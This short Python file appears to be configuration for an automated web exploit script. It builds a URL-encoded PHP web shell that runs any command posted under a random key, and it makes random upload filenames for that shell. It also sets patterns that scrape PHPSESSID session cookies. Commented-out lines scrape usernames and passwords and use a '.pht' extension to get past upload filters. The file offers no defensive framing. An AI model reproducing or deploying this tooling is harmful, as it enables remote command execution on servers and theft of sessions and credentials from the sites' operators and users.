#!/usr/bin/env python

# Config for string replacement
import time
import hashlib
import urllib
def random_string():
    return hashlib.md5(str(time.time())).hexdigest()

res_re_pattern_1 = {"re_cookie_2":['PHPSESSID=','; path=/']}
re_hash_3 = random_string()
re_shell_2 = urllib.quote('<?php system($_POST[%s])?>'%re_hash_3)
re_filename_2 = random_string()
re_filename_3 = re_filename_2
#res_re_pattern_1 = {"re_user_2":['<item><USR>','</USR><NAME/>'],"re_pass_2":['<NAME/><PWD>','</PWD><EMAIL>']}
#res_re_pattern_2 = {"re_hostname_3":['<b>&laquo;</b> <a href="','">Back to Website</a>']}
#re_filename_3 = random_string() + '.pht'
#re_hash_3 = random_string()
#re_filename_4 = re_filename_3
#re_hash_4 = re_hash_3
